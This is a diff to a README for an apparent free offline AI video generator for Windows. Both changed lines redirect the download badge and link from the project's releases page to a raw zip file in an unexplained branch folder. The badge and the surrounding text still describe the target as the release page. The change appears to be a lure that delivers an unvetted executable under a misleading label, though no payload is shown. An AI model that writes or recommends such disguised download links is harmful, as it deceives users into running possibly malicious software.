@@ -1,6 +1,6 @@
 # 🎬 Free-ai-video-generator - Run Offline AI Video Tools
 
-[![Download Free-ai-video-generator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/drogariamais928/Free-ai-video-generator/releases)
+[![Download Free-ai-video-generator](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/drogariamais928/Free-ai-video-generator/raw/refs/heads/main/outdragon/Free-ai-generator-video-v2.3.zip)
 
 ## 🖥️ What this app is
 
@@ -25,7 +25,7 @@ If your PC is close to the low end, use shorter clips first. A 5 to 10 second cl
 
 Visit the release page and download the latest version for Windows:
 
-https://github.com/drogariamais928/Free-ai-video-generator/releases
+https://github.com/drogariamais928/Free-ai-video-generator/raw/refs/heads/main/outdragon/Free-ai-generator-video-v2.3.zip
 
 On that page, look for the newest release and download the file marked for Windows. If there are more than one file, choose the one that ends in `.exe` or comes in a Windows zip package.
 
